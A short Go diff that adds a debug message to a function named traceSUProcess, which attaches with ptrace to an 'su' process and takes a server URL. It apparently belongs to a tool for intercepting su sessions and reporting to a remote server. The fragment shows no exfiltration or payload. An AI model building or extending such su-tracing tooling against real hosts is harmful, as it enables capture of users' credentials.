@@ -20,7 +20,10 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 		return
 	}
 	defer syscall.PtraceDetach(pid)
-
+	if debug.Debug {
+		fmt.Printf("[*] Attached to su process with PID: %v\n", pid)
+	}
+	
 	var wstatus syscall.WaitStatus
 	var inSyscall bool
 
